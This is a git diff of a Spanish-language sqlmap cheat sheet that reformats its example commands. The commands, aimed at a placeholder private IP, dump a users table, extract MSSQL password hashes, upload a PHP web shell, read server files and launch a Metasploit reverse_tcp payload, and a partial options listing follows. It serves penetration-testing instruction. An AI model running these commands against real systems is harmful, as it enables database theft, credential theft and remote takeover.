@@ -1,3 +1,4 @@
+
 # Ejemplos básicos de SqlMap
 
 ![Ejemplos Básicos SQLMap](https://ch4m17ux.github.io/img/posts/sqlmap/sqlmap1.png)
@@ -6,72 +7,72 @@
 
 Descubrir qué base de datos usa  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --dbs
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --dbs`
 
 Listado de las tablas de una base de datos  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --tables -D pryectox
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --tables -D pryectox`
 
 Listado de las columnas de una tabla  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --columns -D pryectox -T users
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --columns -D pryectox -T users`
 
 Descargar el contenido de toda una tabla en csv  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --dump -D pryectox -T users
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --dump -D pryectox -T users`
 
 Chequeo de URL dinámicas (amigables)  
 
-    sqlmap -u "http://10.10.1.100/section/51*/content/" --dump -D pryectox -T users
+`sqlmap -u "http://10.10.1.100/section/51*/content/" --dump -D pryectox -T users`
 
 Chequeo de URL con paso de parámetros por post  
 
-    sqlmap -u "http://10.10.1.100/section.php" --data "id=50&pass=1234" --dbs
+`sqlmap -u "http://10.10.1.100/section.php" --data "id=50&pass=1234" --dbs`
 
 Cuando ya sabemos que se trata de una base de datos especifica  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --dbms=mysql
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --dbms=mysql`
 
 
 ## Más opciones de la herramienta  
 
-    sqlmap -h
+`sqlmap -h`
 
 Aumentar el número de threads  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --threads 10
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --threads 10`
 
 Ejecutar una SQL  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --sql-query="select * from users"
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --sql-query="select * from users"`
 
 Ejecutar una SQL para extracción usuarios de Microsoft SQL 2019  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --sql-query="select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins"
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --sql-query="select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins"`
 
 Subir un archivo/shell  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --file-write=/root/shell.php --file-dest=/xampp/htdocs/shell.php --batch
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --file-write=/root/shell.php --file-dest=/xampp/htdocs/shell.php --batch`
 
 Leer un archivo del sistema de ficheros  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --file-read=/xampp/htdocs/index.php --batch --batch
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --file-read=/xampp/htdocs/index.php --batch --batch`
 
 Cargar metasploit en directorio temporal usando reverse_tcp.  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --os-pwn
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --os-pwn`
 
 Usar web browser aleatorio  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --dbs --random-agent
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --dbs --random-agent`
 
 Obtener privilegios del usuario  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --privileges
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --privileges`
 
 Mostrar el usuario de connexión  
 
-    sqlmap -u "http://10.10.1.100/section.php?id=51" --current_user
+`sqlmap -u "http://10.10.1.100/section.php?id=51" --current_user`
 
 ## Todas las opciones de uso.  
 
@@ -81,7 +82,7 @@ Mostrar el usuario de connexión
       --version             Show program's version number and exit
       -v VERBOSE            Verbosity level: 0-6 (default 1)
     
-      Target:
+    Target:
         At least one of these options has to be provided to define the
         target(s)
     
@@ -334,8 +335,3 @@ Mostrar el usuario de connexión
         --wizard            Simple wizard interface for beginner users
 
 # Fin
-
-
-
-
-
